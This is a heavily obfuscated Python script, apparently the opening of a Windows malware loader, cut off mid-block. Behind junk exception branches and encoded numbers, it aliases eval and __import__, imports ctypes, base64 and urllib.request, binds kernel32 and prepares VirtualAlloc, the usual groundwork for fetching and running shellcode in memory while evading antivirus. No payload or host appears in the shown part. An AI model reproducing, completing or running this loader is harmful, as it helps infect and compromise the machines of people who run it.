__5204867814584 = 0
__5204867814584 += 1
try:
    raise MemoryError(__5204867814584)
except MemoryError as __7136651114837:
    if __7136651114837.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(16) > int(1019) < int(1817) > int(1510))) and bool(str(str(46) > int(127) < int(43) > int(197))) > 2 else bool
    if __7136651114837.args[0] == 3:
        __4544711043083 = 175097708498485
    if __7136651114837.args[0] == 4:
        __4159007475003 = 44564091385152
__6256727962497 = 0
__6256727962497 += 1
try:
    raise MemoryError(__6256727962497)
except MemoryError as __3454505649955:
    if __3454505649955.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(14) > int(168) < int(816) > int(37))) and bool(str(str(813) > int(711) < int(191) > int(15))) > 2 else str
    if __3454505649955.args[0] == 3:
        __7059000567253 = 159880907625442
    if __3454505649955.args[0] == 4:
        __7377307346665 = 109122501434258
__3708885636373 = 0
__3708885636373 += 1
try:
    raise MemoryError(__3708885636373)
except MemoryError as __3993243682026:
    if __3993243682026.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(611) > int(1811) < int(115) > int(87))) and bool(str(str(58) > int(53) < int(1017) > int(511))) > 2 else type
    if __3993243682026.args[0] == 3:
        __8269144562016 = 237852358637306
__4757492846231 = 0
__4757492846231 += 1
try:
    raise MemoryError(__4757492846231)
except MemoryError as __6751989766424:
    if __6751989766424.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(919) > int(1410) < int(518) > int(1915))) and bool(str(str(59) > int(610) < int(619) > int(91))) > 2 else int
    if __6751989766424.args[0] == 3:
        __4661228235760 = 94128995382017
    if __6751989766424.args[0] == 4:
        __4034835069410 = 129556886328942
    if __6751989766424.args[0] == 5:
        __3699162017253 = 242015383950190
    if __6751989766424.args[0] == 6:
        __7794697725298 = 114864139961073
__7625346615533 = 0
__7625346615533 += 1
try:
    raise MemoryError(__7625346615533)
except MemoryError as __2716918368452:
    if __2716918368452.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(137) > int(214) < int(713) > int(1912))) and bool(str(str(109) > int(162) < int(68) > int(137))) > 2 else bytes
    if __2716918368452.args[0] == 3:
        __4767736323638 = 270050103759097
    if __2716918368452.args[0] == 4:
        __3774573111374 = 136217340841863
    if __2716918368452.args[0] == 5:
        __3042375352934 = 129986290891230
    if __2716918368452.args[0] == 6:
        __3675941565773 = 19913674074871
__6147033539195 = 0
__6147033539195 += 1
try:
    raise MemoryError(__6147033539195)
except MemoryError as __2264617615534:
    if __2264617615534.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(717) > int(817) < int(52) > int(87))) and bool(str(str(36) > int(1810) < int(717) > int(132))) > 2 else vars
    if __2264617615534.args[0] == 3:
        __2189984567451 = 180172836493181
    if __2264617615534.args[0] == 4:
        __4340814583039 = 258722373822241
    if __2264617615534.args[0] == 5:
        __6700427653967 = 111578346511062
__2505406587739 = 0
__2505406587739 += 1
try:
    raise MemoryError(__2505406587739)
except MemoryError as __4950943905927:
    if __4950943905927.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(12) > int(115) < int(613) > int(182))) and bool(str(str(510) > int(114) < int(511) > int(179))) > 2 else callable
    if __4950943905927.args[0] == 3:
        __2114147719600 = 165578652473382
    if __4950943905927.args[0] == 4:
        __4274960139556 = 187469372629754
__2601527093180 = 0
__2601527093180 += 1
try:
    raise MemoryError(__2601527093180)
except MemoryError as __7272377733418:
    if __7272377733418.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(176) > int(515) < int(95) > int(172))) and bool(str(str(1810) > int(67) < int(31) > int(1811))) > 2 else eval
    if __7272377733418.args[0] == 3:
        __6612631896046 = 180536520884171
    if __7272377733418.args[0] == 4:
        __5878596222715 = 269648245276707
    if __7272377733418.args[0] == 5:
        __3663840920582 = 108765747479
    if __7272377733418.args[0] == 6:
        __6360548625166 = 74568577499794
__8451319085935 = 0
__8451319085935 += 1
try:
    raise MemoryError(__8451319085935)
except MemoryError as __4666413837996:
    if __4666413837996.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(212) > int(85) < int(512) > int(194))) and bool(str(str(1011) > int(111) < int(138) > int(615))) > 2 else list
    if __4666413837996.args[0] == 3:
        __5496804588106 = 153289674046771
    if __4666413837996.args[0] == 4:
        __3499646287937 = 78275277488273
    if __4666413837996.args[0] == 5:
        __2064359231475 = 81290604318338
__6325490304733 = 0
__6325490304733 += 1
try:
    raise MemoryError(__6325490304733)
except MemoryError as __5024248523382:
    if __5024248523382.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(52) > int(135) < int(1512) > int(35))) and bool(str(str(312) > int(72) < int(107) > int(818))) > 2 else map
    if __5024248523382.args[0] == 3:
        __4618255189793 = 254850216630189
    if __5024248523382.args[0] == 4:
        __6860131010270 = 228729262191503
__2535117087570 = 0
__2535117087570 += 1
try:
    raise MemoryError(__2535117087570)
except MemoryError as __6789084036737:
    if __6789084036737.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(619) > int(214) < int(418) > int(311))) and bool(str(str(310) > int(112) < int(119) > int(1410))) > 2 else __import__
    if __6789084036737.args[0] == 3:
        __2355968365804 = 3137056472655
    if __6789084036737.args[0] == 4:
        __7844541437087 = 106033186495350
    if __6789084036737.args[0] == 5:
        __2617903703084 = 9133675109506
    if __6789084036737.args[0] == 6:
        __5071071294289 = 130673701452705
    if __6789084036737.args[0] == 7:
        __3035047280212 = 201321054013018
__5259495788714 = 0
__5259495788714 += 1
try:
    raise MemoryError(__5259495788714)
except MemoryError as __7526573640992:
    if __7526573640992.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(162) > int(26) < int(171) > int(1110))) and bool(str(str(56) > int(167) < int(819) > int(1615))) > 2 else print
    if __7526573640992.args[0] == 3:
        __8242262532858 = 278640152468880
__6896584938047 = 0
__6896584938047 += 1
try:
    raise MemoryError(__6896584938047)
except MemoryError as __5903513628188:
    if __5903513628188.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(1516) > int(215) < int(41) > int(314))) and bool(str(str(1210) > int(919) < int(1213) > int(710))) > 2 else input
    if __5903513628188.args[0] == 3:
        __8114603460605 = 215408062739002
    if __5903513628188.args[0] == 4:
        __6075477316299 = 148101334812409
    if __5903513628188.args[0] == 5:
        __2574490792728 = 225417866396740
    if __5903513628188.args[0] == 6:
        __7735041074031 = 279162220459272

def R_E_D__A_V____(RED_DEFENDER, *k):
    __4976440449220 = 0
    __4976440449220 += 1
    try:
        raise MemoryError(__4976440449220)
    except MemoryError as __8194227183680:
        if __8194227183680.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __8194227183680.args[0] == 1:
            globals()['_111'] = (lambda : (lambda _518: _518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __8194227183680.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __8194227183680.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __8194227183680.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __8194227183680.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _111:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _1516: _1516 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __8194227183680.args[0] == 1:
            return R_E_D____A_V
        if __8194227183680.args[0] == 9:
            __6524654384873 = 124664058401761
        if __8194227183680.args[0] == 10:
            __7484459299829 = 24063838165912
        if __8194227183680.args[0] == 11:
            __7641173835816 = 213662830664868
        if __8194227183680.args[0] == 12:
            __3127172295788 = 32755075313720
        if __8194227183680.args[0] == 13:
            __8448355960956 = 56761537392625

def ______R_E_D__A_V_______(x):
    __7567173113395 = 0
    __7567173113395 += 1
    try:
        raise MemoryError(__7567173113395)
    except MemoryError as __4675898796702:
        if __4675898796702.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __4675898796702.args[0] == 3:
            __5623553596629 = 266286583684971
        if __4675898796702.args[0] == 4:
            __5401214849115 = 115544650395243
        if __4675898796702.args[0] == 5:
            __2313078456430 = 92852042544767

def R_E_D__A_V(e):
    __5071458086306 = 0
    __5071458086306 += 1
    try:
        raise MemoryError(__5071458086306)
    except MemoryError as __7582352367532:
        if __7582352367532.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __7582352367532.args[0] == 1:
            r = 0
        if __7582352367532.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __7582352367532.args[0] == 1:
            return r
        if __7582352367532.args[0] == 6:
            __5706074157081 = 15501524301452
        if __7582352367532.args[0] == 7:
            __7892241577151 = 90648241312865
        if __7582352367532.args[0] == 8:
            __3237257993613 = 191665900951017
        if __7582352367532.args[0] == 9:
            __5964792756625 = 183754724407454
        if __7582352367532.args[0] == 10:
            __5289612368057 = 243712261965440

def ____________________________(x):
    __4316841431581 = 0
    __4316841431581 += 1
    try:
        raise MemoryError(__4316841431581)
    except MemoryError as __3097224394100:
        if __3097224394100.args[0] == 1:
            ar = []
        if __3097224394100.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __3097224394100.args[0] == 1:
            return ar
        if __3097224394100.args[0] == 5:
            __3681429062759 = 102751001030075
        if __3097224394100.args[0] == 6:
            __5382762769614 = 249687072150488
        if __3097224394100.args[0] == 7:
            __2826395418626 = 5587327290026
        if __3097224394100.args[0] == 8:
            __6709390097951 = 49495837801160
if (lambda : (lambda _15: _15 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '1917' == '1219':
        case True:
            raise MemoryError([True])
        case False:
            _1115 = [[True], [False]]
            R_E_D__A_V______(['_514'])
    raise MemoryError([True])
except MemoryError as _139:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _118: _118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1014 = [[(lambda : (lambda _618: _618 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _196: _196 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _161: _161 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1113:
        import sys
try:
    match '118' == '314':
        case True:
            raise MemoryError([True])
        case False:
            _1613 = [[True], [False]]
            R_E_D__A_V______(['_816'])
    raise MemoryError([True])
except MemoryError as _1016:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _613: _613 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _515 = [[(lambda : (lambda _105: _105 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _82: _82 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _134: _134 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _171:
        import ctypes
try:
    match '1715' == '153':
        case True:
            raise MemoryError([True])
        case False:
            _412 = [[True], [False]]
            R_E_D__A_V______(['_35'])
    raise MemoryError([True])
except MemoryError as _177:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1317: _1317 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1516 = [[(lambda : (lambda _96: _96 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _18: _18 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _87: _87 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _191:
        import base64
try:
    match '1618' == '36':
        case True:
            raise MemoryError([True])
        case False:
            _316 = [[True], [False]]
            R_E_D__A_V______(['_210'])
    raise MemoryError([True])
except MemoryError as _94:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _163: _163 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _114 = [[(lambda : (lambda _73: _73 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1918: _1918 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _175: _175 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _98:
        import ctypes.wintypes as wt
try:
    match '419' == '1316':
        case True:
            raise MemoryError([True])
        case False:
            _1017 = [[True], [False]]
            R_E_D__A_V______(['_616'])
    raise MemoryError([True])
except MemoryError as _114:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _81: _81 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _147 = [[(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _126: _126 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _199: _199 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _114:
        import urllib.request
try:
    match '711' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _1012 = [[True], [False]]
            R_E_D__A_V______(['_93'])
    raise MemoryError([True])
except MemoryError as _619:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1013: _1013 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1913 = [[(lambda : (lambda _78: _78 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1916: _1916 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _149: _149 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1210:
        __5824510406833 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '514' == '317':
        case True:
            raise MemoryError([True])
        case False:
            _107 = [[True], [False]]
            R_E_D__A_V______(['_1512'])
    raise MemoryError([True])
except MemoryError as _167:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _812 = [[(lambda : (lambda _192: _192 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1112: _1112 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _192: _192 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _152:
        __5824510406833 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '68' == '199':
        case True:
            raise MemoryError([True])
        case False:
            _59 = [[True], [False]]
            R_E_D__A_V______(['_313'])
    raise MemoryError([True])
except MemoryError as _108:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _26: _26 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _317 = [[(lambda : (lambda _216: _216 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _182: _182 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _189: _189 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _514:
        try:
            raise MemoryError(__5824510406833)
        except MemoryError as __3559895443332:
            if __3559895443332.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __3559895443332.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8137500160168 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x1f\xdej\x06p\x9c'))()
            if __3559895443332.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3952964398195 = (lambda : R_E_D__A_V(b'R_E_D__A_V__m\x81(\x1f5\xa8'))()
            if __3559895443332.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6310386899461 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf8I\x82\xef\xf2P'))()
try:
    match '135' == '514':
        case True:
            raise MemoryError([True])
        case False:
            _87 = [[True], [False]]
            R_E_D__A_V______(['_1810'])
    raise MemoryError([True])
except MemoryError as _412:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _410: _410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1718 = [[(lambda : (lambda _315: _315 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _58: _58 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _172: _172 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1617:
        __7667489897466 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1514' == '213':
        case True:
            raise MemoryError([True])
        case False:
            _118 = [[True], [False]]
            R_E_D__A_V______(['_176'])
    raise MemoryError([True])
except MemoryError as _29:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _35: _35 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1811 = [[(lambda : (lambda _316: _316 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _138: _138 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _131: _131 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _711:
        __7667489897466 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1619' == '916':
        case True:
            raise MemoryError([True])
        case False:
            _142 = [[True], [False]]
            R_E_D__A_V______(['_1011'])
    raise MemoryError([True])
except MemoryError as _1615:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _417: _417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _36 = [[(lambda : (lambda _176: _176 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _212: _212 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1412: _1412 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _136:
        try:
            raise MemoryError(__7667489897466)
        except MemoryError as __2614487339047:
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8042248889815 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05o\xc85\x9ew'))()
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3718068382303 = (lambda : R_E_D__A_V(b'R_E_D__A_V__F&\xa3\xb1\xb5\x93'))()
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3238371189406 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xed\xders\xe3\xfb'))()
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __5558336749711 = (lambda : R_E_D__A_V(b'R_E_D__A_V__y\xb8\x95\xde\xfdp'))()
            if __2614487339047.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __3753648038291 = (lambda : R_E_D__A_V(b'R_E_D__A_V__$\xf1\xf5G\xb1\xe4'))()
try:
    match '1511' == '1714':
        case True:
            raise MemoryError([True])
        case False:
            _816 = [[True], [False]]
            R_E_D__A_V______(['_84'])
    raise MemoryError([True])
except MemoryError as _1311:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _715: _715 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _119 = [[(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _122: _122 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _37:
        __8121457015207 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '79' == '1210':
        case True:
            raise MemoryError([True])
        case False:
            _1519 = [[True], [False]]
            R_E_D__A_V______(['_1211'])
    raise MemoryError([True])
except MemoryError as _86:
    try:
